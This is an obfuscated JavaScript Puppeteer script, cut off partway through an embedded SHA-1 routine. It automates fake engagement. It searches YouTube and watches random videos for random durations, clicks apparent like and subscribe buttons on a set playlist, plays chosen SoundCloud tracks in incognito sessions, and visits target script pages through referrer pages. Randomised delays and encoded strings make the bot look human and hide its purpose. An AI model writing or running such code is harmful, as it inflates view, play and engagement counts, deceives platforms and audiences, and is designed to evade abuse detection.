const Z = b,
  Y = d,
  X = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x2519 * 0x1 + 0x21b0 + -0x1e * 0x25c))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1884 + 0x1 * -0x5d7 + 0x1e5b), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x9ac2 + 0x61c4 + -0x2 * 0x43ab + (-0x3249 + 0x3 * -0x16f + 0x712e) * random()) : await standardWaitForNetIdle(f), await wait(0xd28 + -0x3e * -0x51 + -0xd3e + (-0x9 * 0x679 + -0x1b20 + -0x309 * -0x29) * random()), -0x1108 + 0xbea + 0x51f;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x1208 + 0x1 * 0x1913 + -0x1793 * 0x1), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x7 * 0x4e1 + -0x1762 + -0xac4;
}
async function randomWait() {
  return await wait(0x14a + 0x3 * 0x49d + 0x467 + (-0xad4 + 0xd0e + 0x114e) * random()), 0x20a * -0x8 + -0x1d40 + 0x2d91;
}
async function watchRandomFrontScreenVideo(f) {
  const S = b;
  await f['evaluate'](() => {
    const R = b;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + R(0x8, 'MbKE') + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x68c * -0x5 + 0x1f44 + 0x178, 0x130c + -0xa97 * 0x1 + -0x86e), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click'](S(0x9, 'U8P&')), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x8133 + -0x7c9 * 0x5 + 0x19280) * getRandomInt(-0x189a + 0x1290 + 0x60c, -0x126d + -0x373 * 0x2 + 0x4 * 0x656), h)), 0x73 * 0x27 + -0x2 * 0xff3 + 0x7 * 0x20e;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x23d3 + -0x151b + 0x8 * -0x1d7;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x2 * 0x3cd + 0x95f * 0x3 + -0x23b6]['split']('\x20');
    for (let k = 0xeb0 + -0x91d * -0x1 + -0x1 * 0x17cd; k < i['length']; k += -0x50e + -0x1 * -0x18df + -0x13cf)
      j += i[k] * h[i[k + (0x1a57 + 0xcda + 0xe4 * -0x2c)]];
    return j;
  });
}
async function anchorAndView(f) {
  const T = c;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f[T(0x4)](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x2533 * -0x1 + 0x4d4 + 0x2a01 * -0x1)['map'](l => Array['from'](l['children']))['flat'](-0x10d + -0x1 * 0xc04 + 0xd12)['map'](l => l['childNodes'][0xdf6 + 0x50a + -0x12ff]['childNodes'][0x119b + 0x1779 + 0xef * -0x2c]['childNodes'][-0x1b07 + 0x1fb5 * 0x1 + -0x4ad]['childNodes'][0x1efc + -0x10d * -0x16 + -0x361a]['childNodes'][0x1ae * -0x1 + 0xeee + -0x1 * 0xd3f]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x149a + -0x12b5 + 0x203, -0x244d * 0x1 + 0x1fdf + -0x1 * -0x17f6)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x5c9 + 0x1e9f + 0x3a * 0x95);
  const h = await getMaxTime(f),
    i = Math['min']((-0x1 * -0x1b041 + -0xba1a + 0x9 * -0x14f) * getRandomInt(-0xc8d + -0x1d * 0xc1 + 0x226c, 0x20ca + 0x3 * 0x4ed + 0x2cc * -0x11), h);
  return await wait(i), 0x1 * 0x22f3 + -0x13 * 0xb7 + -0x155d;
}
async function frontScreenActions(f) {
  const U = b;
  return log(U(0x7, 'ymwA') + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x2691 * -0x1 + 0x198f + -0x1e * -0x6f]['children'][-0xc9 * 0x2f + -0x2ba + 0x27a1]['children'][0x1 * -0xdf5 + 0x47 * 0x5d + -0xbd6]['children'][-0x1d74 + 0xff * -0x5 + -0x1 * -0x226f]['children'][0x3d5 * 0x6 + 0x24 * -0x1b + -0x27 * 0x7e]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0xe97 + -0x1 * -0x1b57 + -0xcbf;
}
async function searchAndView(f) {
  const V = c;
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x1 * 0x257 + -0x1d * 0xfa + 0x1a5f + (-0x61 * 0xe + 0x1 * -0x20ab + 0x262b * 0x1) * random()
  }), await wait(0x117a + 0x3 * 0xf + 0xfb3 * -0x1 + (-0x7f7 * -0x1 + 0x1858 + 0x1f23 * -0x1) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x1 * -0x21fd + -0x1 * -0x24cb + -0x2cc]['childNodes'][-0xf5 * 0x1a + 0x22bf + -0x9dc]['childNodes'][0x9d3 + -0x1d14 + -0x22 * -0x91]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x25f7 + -0x2422 + 0x4a1e * 0x1]['childNodes'][-0x1 * 0x1ec5 + -0xf1a + 0x2ddf]['childNodes'][-0x2dd * -0x3 + -0x169c + -0x85 * -0x1b]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0xb5b + 0x18c * -0x16 + 0x2d64),
          r = -0x21ae + -0xbf1 + 0x2d9f;
        for (let u = -0xa * 0x3be + -0x118b * 0x1 + 0x36f7; u < q['length']; u += 0x79 * 0x2b + 0x1 * -0xd51 + -0x700)
          r += q[u] * k[q[u + (-0x1be6 + 0x32 * -0x31 + 0xb5 * 0x35)]];
        return r;
      }(n);
  });
  await wait((0x1e24 + -0x3238 + 0x4eac) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math[V(0x16)]((-0x1c6c1 + -0x4672 + -0xfd31 * -0x3) * getRandomInt(-0x237b * -0x1 + -0x2245 * 0x1 + -0x135, 0x1f39 * 0x1 + 0x6d0 + -0x25ff), h + (-0xdd5 * -0x1 + -0x2f2 + 0x1 * 0x8a5));
  return await wait(i), -0x1 * -0x1be3 + -0xcc3 + -0xf1f;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1287 + -0x1a19 + 0x2ca0);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x11b * 0x1f + 0x2439 + -0x1f4), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x4 * -0x4ea + -0x873 + 0x83 + (-0x82b + 0x2 * 0xba5 + -0xb37) * Math['random']());
    });
  }, 0x1cfd + 0x1069 * 0x2 + -0xad * 0x33);
  await wait(0x1f9af + -0x1 * 0x4e9f2 + -0x9 * -0xd5cb);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x4c55 + 0x10d * -0x48 + 0xe9b3) * getRandomInt(0x1eda + -0x1b5 * -0x2 + 0x10 * -0x224, -0x13 * 0xe5 + 0x2209 + -0x10f1)), clearInterval(h), 0xb * -0x49 + -0x147d + -0x17 * -0x107;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x26c9 + 0x656 * -0x1 + -0x3 * 0xad1;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x3e5 * -0x9 + -0x26d2 + 0x49e0;
    await randomWait();
  }
  return -0x3 * 0x66f + -0x1f4c + -0x329a * -0x1;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1287 + -0x1a19 + 0x2ca0);
    let h = e[f];
    if (c['EjdIxS'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x18c7 + -0x2 * -0x1082 + -0x83d, r, s, t = -0x9 * -0x33b + 0x1 * -0x71e + -0x15f5; s = m['charAt'](t++); ~s && (r = q % (0x2519 * 0x1 + 0x21b0 + -0x3d * 0x129) ? r * (-0x1884 + 0x1 * -0x5d7 + 0x1e9b) + s : s, q++ % (0x19cb + 0x104c + -0x1 * 0x2a13)) ? o += String['fromCharCode'](-0x10c3 + 0x1 * -0x16f + 0x1331 & r >> (-(0xd28 + -0x3e * -0x51 + -0x20c4) * q & -0x1 * 0x1d21 + -0xd90 + -0x195 * -0x1b)) : -0x1108 + 0xbea + 0x51e) {
          s = n['indexOf'](s);
        }
        for (let u = 0x1208 + 0x1 * 0x1913 + -0x2b1b * 0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x7 * 0x4e1 + -0x1762 + -0xab5))['slice'](-(0x14a + 0x3 * 0x49d + -0xf1f));
        }
        return decodeURIComponent(p);
      };
      c['VyTMHc'] = i, b = arguments, c['EjdIxS'] = !![];
    }
    const j = e[-0xad4 + 0xd0e + -0x23a],
      k = f + j,
      l = b[k];
    return !l ? (h = c['VyTMHc'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function fetchRandomSC() {
  return Math['random']() <= -0x9c2 + -0x229b + 0x115 * 0x29 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x7 * 0x37d + 0x2030 + -0x7c5 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x833 + 0xb65 + -0x2 * 0x9cc + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x124 * 0x7 + -0x18ad + -0x1 * -0x10b1;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x15153 + 0x780b + 0x18910 + getRandomInt(-0x6bfc + -0x2d77 * -0x1 + 0x791d, -0x76d * 0x5 + 0x121 * -0xb5 + 0x166a6));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x17 * 0x1a3 + 0x1 * -0x26ff + 0x4ca5), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1d60 + 0x13 * 0x1d3 + -0xd * 0x4ed;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x16af * 0x1 + -0xe35 * 0x2 + -0x1 * -0x3319, -0x2af + -0xd94 + -0xb * -0x17f)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x7 * -0x2b + -0x1c3a + -0x1 * -0x2537 + floor((-0x2214 + 0x7a0 + 0x1e5c) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x15b90837 * -0x4 + 0xd26dbb20 + 0x47665bc),
          0x601f * -0x1e9 + 0x40195 * -0x6 + 0x14fa4b5,
          0x3e6b + -0x5a96 + 0x9c2b,
          0x80c + -0x21ab + 0x1a1f * 0x1
        ], y = [
          -0x1 * -0x68d + 0x11c * 0x6 + -0x1 * 0xd1d,
          0x7 * 0x3e1 + -0x3 * -0x313 + -0x48a * 0x8,
          0x2361 + -0x3 * -0x5f3 + -0x3532,
          -0x17a7 + -0x2fb * -0x7 + 0x2ca
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x9e0 + -0xded + 0x22a * 0xb)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x20e * 0xe + -0x2 * 0x1145 + 0x5c6; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0xc14 * -0x2 + 0x1c55 * -0x1 + 0x42d * 0x1) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x1 * -0x1f34 + -0x8ec * 0x1 + 0x2820] = A[0x1 * -0x2395 + 0xdf2 + 0x15b3] = A[0xea9 * 0x1 + -0x104e * -0x2 + -0x2f44] = A[0x87e + 0x1 * -0x1ef6 + -0x2a * -0x89] = A[0x2133 + 0x1f9d + 0x139 * -0x35] = A[0xe1a + -0xd5e + -0xb8] = A[0x13 * 0x15f + 0xc5d + -0x2665] = A[-0x12 * -0x33 + 0xaa1 + -0xe31] = A[0x100 * -0x27 + 0x1958 + 0x1f * 0x71] = A[0xe0e * -0x1 + -0x259 * -0x5 + 0x259] = A[-0x116 * -0x2 + -0x3f * -0x7d + 0x2 * -0x1073] = A[-0x28 * 0x5 + 0x32 * 0x21 + -0x5a0] = A[-0x1d3 + -0x1 * 0xa85 + -0x1c5 * -0x7] = A[0x1cc6 + -0x1a0d + -0x2ad] = A[-0x21d * 0x1 + 0xc6c + -0xa42] = A[-0x1459 + -0x5 * -0x55d + -0x66a] = A[0x1ff * -0xc + 0x987 + -0x12 * -0xce] = 0x3f * 0x4f + 0x3c4 + -0x1735, this['blocks'] = A) : this['blocks'] = [
                0x17f * 0x1 + -0x79d * 0x5 + -0x2492 * -0x1,
                -0x1f * -0x89 + -0x11 * -0x169 + -0x58 * 0x76,
                0x66d + 0x1b * 0x5b + -0x125 * 0xe,
                -0x1ede + 0x1 * 0x184d + 0x691,
                0x4ef * -0x7 + 0xe10 + 0x1479,
                -0x959 * 0x1 + 0x696 * -0x1 + 0xfef,
                0x116d + 0xa * -0x35b + 0x1 * 0x1021,
                0x1 * -0x1889 + -0x1d8b + -0xd85 * -0x4,
                -0x26f8 + -0xbd8 + 0x32d0,
                -0x1304 + 0x1 * -0x1c65 + -0x1 * -0x2f69,
                0x4c1 + -0x207 * 0xc + 0x1393,
                -0x2451 + 0x1e06 + 0x64b,
                -0x1809 + 0x251a * 0x1 + -0xd11,
                0xd44 + -0x19c6 + 0xc82,
                -0x1732 * -0x1 + 0x1b0e + -0x3240,
                -0xe6f + -0x235b + 0x31ca,
                0xc0a + 0x2de * -0x5 + 0x24c
              ], this['h0'] = 0x50d * 0x24e557 + -0x78710509 + 0x255bcf9f, this['h1'] = 0x181a87b9 * -0xd + 0x2a4f9daf + 0x274b9c7b * 0xd, this['h2'] = -0x44d5c8 * 0x3eb + -0x157 * -0x246b5 + 0x1a35fb713 * 0x1, this['h3'] = 0x118dbf76 + -0x745d * -0x1925 + -0xcc95171 * 0x1, this['h4'] = -0xdaa6bc27 + -0x117d8cd05 + 0x2b6526b1c, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x3 * -0xcc2 + 0x2 * 0x472 + 0x1d62, this['finalized'] = this['hashed'] = 0x2203 + 0x9 * 0x1a9 + 0xc3d * -0x4, this['first'] = 0x7ae + -0x110c + -0x1 * -0x95f;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x1f84 + 0xe2 * -0x13 + 0x304a, O = J['length'] || -0x1 * -0x1bf2 + -0x1 * 0x1a69 + -0x189, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x19f0 + -0x115 + 0x1b05, P[-0x1ef + 0x95b + -0x13 * 0x64] = this['block'], P[0x1 * 0x20fb + -0x2b3 * -0xa + -0x1 * 0x3be9] = P[0x133c + 0x2707 * 0x1 + -0x2 * 0x1d21] = P[0x1cf6 + -0x2380 + -0x1 * -0x68c] = P[0xb * 0x197 + -0x1f1d + 0xda3] = P[0x243a + -0x3d6 + -0x2060 * 0x1] = P[-0x10a8 + -0x1004 + 0x20b1] = P[0x1114 + 0xe * -0x52 + 0x2 * -0x649] = P[-0xd * -0x2ad + -0x65 * 0x57 + 0x6f * -0x1] = P[-0x2a2 * 0x1 + 0x10 * -0x7f + 0xa9a] = P[0x1b56 + 0xa * -0x247 + -0x13 * 0x3d] = P[-0x1 * 0xec5 + -0x178a + -0x1 * -0x2659] = P[-0xd3d * -0x1 + -0x6a * -0x25 + -0x5b4 * 0x5] = P[-0x154b + -0x1379 * -0x2 + -0x119b] = P[-0x1 * -0x96e + -0x710 * -0x4 + 0xd * -0x2e5] = P[0x53 * -0x17 + 0x1 * -0x1b37 + -0x4f6 * -0x7] = P[-0x979 + -0xc * 0x155 + 0x1984] = -0xa8 * 0xf + 0x127 * 0x12 + 0x5 * -0x22e), K) {
                    for (N = this['start']; M < O && N < 0x1a31 * 0x1 + 0xb4 * -0x2b + -0x1 * -0x44b; ++M)
                      P[N >> 0x2 * -0x1346 + -0x6 * 0x11e + 0x2d42] |= J[M] << y[0x1b7a + 0xd4 + 0x1 * -0x1c4b & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x7 * 0x2ae + 0x257a + -0x4 * 0x49e; ++M)
                      (L = J['charCodeAt'](M)) < -0x3be + 0x231 * -0x2 + 0x8a0 ? P[N >> -0x3 * 0x4e0 + 0x48e * 0x3 + 0xf8] |= L << y[0x260e * 0x1 + -0x1 * 0xa16 + -0x1bf5 & N++] : L < 0x4d4 + -0xe * -0x1a3 + 0x1 * -0x13be ? (P[N >> 0xf25 + -0x13d * -0x19 + -0x2e18] |= (0x1bcf + -0x1 * 0x1e25 + -0x1 * -0x316 | L >> 0x1f74 + 0x1 * 0x22de + -0x2 * 0x2126) << y[0x1 * 0x2536 + -0x1874 * -0x1 + -0x3da7 & N++], P[N >> -0x432 + 0x1d55 + 0x1 * -0x1921] |= (0xfe5 + -0x1d * -0x1 + -0x5 * 0x31a | -0xe3 * 0xb + 0x3dd * -0x1 + 0xd * 0x111 & L) << y[-0x1ab1 + -0x7 * -0x51b + 0x303 * -0x3 & N++]) : L < -0x11 * -0x89f + 0x18447 + -0x13ed6 || L >= 0x1b4f5 + -0x9 * 0x28db + 0x9abe ? (P[N >> 0x1 * -0x1bef + 0x97 * 0x31 + 0xf6 * -0x1] |= (-0x1a2f + -0xb08 + 0x7 * 0x571 | L >> 0x2461 + 0x1f46 + -0x439b) << y[-0xd4e + 0xc39 + 0x118 * 0x1 & N++], P[N >> 0x251f + -0x2584 + 0x67] |= (0x1 * -0x2096 + 0x1 * 0x10b1 + 0x3 * 0x577 | L >> 0x8c6 * -0x3 + -0xee3 + 0x293b & -0x314 * 0x4 + -0x2499 + 0x3128) << y[0xea4 + 0x22d1 * -0x1 + -0x2 * -0xa18 & N++], P[N >> 0x57a + -0x24b3 + 0x1f3b] |= (0xca2 * 0x1 + -0x1 * 0x1433 + 0x23 * 0x3b | -0x101 * 0x1f + -0x20f9 * -0x1 + 0x19b * -0x1 & L) << y[-0x3e5 * -0x9 + 0x5 * -0x237 + -0x17f7 & N++]) : (L = -0x5f * 0xfa + -0x17b * 0xfd + -0x2d355 * -0x1 + ((-0x1904 * 0x1 + -0x1 * -0xd5f + -0x16 * -0xb6 & L) << -0xf01 + -0x22f3 * 0x1 + 0x31fe | -0x16c * 0x11 + 0x2 * -0xcdd + -0x9 * -0x5fd & J['charCodeAt'](++M)), P[N >> 0x2e1 * -0xc + -0x24a * 0x11 + -0x1 * -0x4978] |= (0x1 * -0x24a2 + 0x2390 + 0x202 | L >> -0xf1c + 0x6c * -0x3 + -0x34a * -0x5) << y[-0xdb9 + 0x85d * 0x3 + -0x3 * 0x3c9 & N++], P[N >> -0x3 * -0x94d + -0x1e9 * 0xd + -0x310] |= (0x5c1 + -0x1c18 + 0x16d7 | L >> 0x153f + -0x10d4 + -0x45f & -0x1d66 + 0x1621 + -0xd * -0x94) << y[0x494 * 0x8 + 0x1d4c + -0x41e9 & N++], P[N >> -0xd3f * -0x1 + -0x2662 + 0x1925] |= (-0x2 * 0xebc + -0x232d * -0x1 + -0x535 | L >> 0x22ba + 0x5 * 0x605 + 0x40cd * -0x1 & -0x1 * -0x1d18 + 0x1d2 * 0x4 + -0x3 * 0xc0b) << y[0x1 * 0xdfe + 0x2042 + -0x2e3d & N++], P[N >> 0xe19 + 0x153f + -0x2 * 0x11ab] |= (0x17cd + -0x3 * 0x9e7 + -0x5 * -0x148 | -0x32 * -0xb + 0x1d92 + -0x47f * 0x7 & L) << y[0x1cdb * -0x1 + 0x1 * 0x236f + 0x29 * -0x29 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1d * -0xd4 + -0x2 * -0x2cf + -0x1d62 ? (this['block'] = P[-0xb * -0x238 + -0xb * -0x7e + -0x1 * 0x1dc2], this['start'] = N - (-0x17a1 + -0x5c * -0xd + 0x1335), this['hash'](), this['hashed'] = 0x163d + -0xda6 + -0x896) : this['start'] = N;
                }
                return this['bytes'] > -0x2354200 * -0x1 + 0x3 * -0x4491ccf1 + -0x33b * -0x8e3d56 && (this['hBytes'] += this['bytes'] / (-0xe64c * 0xb52d + 0x17eb22d2c + -0x3b444 * -0x9cc) << -0x1183 * 0x1 + -0x1b94 + 0x11 * 0x2a7, this['bytes'] = this['bytes'] % (0x20 * 0xb6f6f9f + -0x11440c * -0x1b7 + -0x8b89a474)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x17 * 0x1f + -0x1cc5 + -0x19fd * -0x1;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x864 + 0x1eb6 + -0x270a] = this['block'], J[K >> -0x459 + -0x9b + 0x4f6] |= x[0xf70 + 0x14 * -0xcd + 0x97 * 0x1 & K], this['block'] = J[-0xb * -0x117 + -0x1bbf + 0xfd2], K >= 0x3d7 * -0x2 + 0x1a7a + 0x1294 * -0x1 && (this['hashed'] || this['hash'](), J[-0x2 * -0xe12 + -0x21d5 + 0x5b1] = this['block'], J[0x2013 + 0x36 * 0x20 + 0x1 * -0x26c3] = J[0x1 * 0x20e7 + -0x2515 + 0x42f] = J[-0x1c82 + 0x701 + -0x1 * -0x1583] = J[-0x1611 + 0x3a * 0x73 + -0x2 * 0x1fd] = J[-0xfe1 + -0x363 * -0x4 + -0x1 * -0x259] = J[0x630 + 0x1 * 0xd1c + -0x1347] = J[0x169 * -0x13 + 0x11 * 0x1f + 0x18c2] = J[-0xf * 0x167 + 0x282 + 0x128e] = J[0xa48 + 0x1 * 0x1acb + -0x57 * 0x6d] = J[-0x866 + -0x9a7 + 0x39e * 0x5] = J[-0x1539 + 0x24d2 + -0x239 * 0x7] = J[0xfa * 0x1f + -0x90b + -0x1530] = J[0x269d + -0xd * 0xe5 + -0x1af0] = J[0x716 + 0x7b5 + -0xebe] = J[0x2195 + -0x1cdc + -0x4ab] = J[-0x7a3 * -0x3 + 0x4 * 0xed + -0x135 * 0x16] = 0x1f2a * 0x1 + 0x2178 + -0x40a2), J[0x168b + -0x1 * -0xef + -0x176c] = this['hBytes'] << 0xc4d * -0x2 + -0x12bb + 0x2b58 | this['bytes'] >>> -0x39f + 0x1d9b + -0x19df, J[-0x13 * 0x1df + -0x16bd + 0x47d * 0xd] = this['bytes'] << 0x266 * -0xa + 